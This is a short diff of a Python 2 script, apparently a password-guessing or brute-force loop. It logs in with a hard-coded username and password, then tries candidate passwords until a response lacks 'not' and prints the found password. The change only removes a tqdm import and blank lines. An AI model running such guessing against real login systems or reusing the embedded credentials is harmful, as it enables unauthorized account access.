@@ -1,5 +1,4 @@
 import requests
-from tqdm import tqdm
 
 s = requests.Session()
 login_data = {'username':'aksagg', 'password':'WLyyNdQSjc6QXx1'}
@@ -25,7 +24,3 @@ while True:
             if "not" not in r.text:
                 print "The password is" , trypass 
                 quit()
-
-
-
-
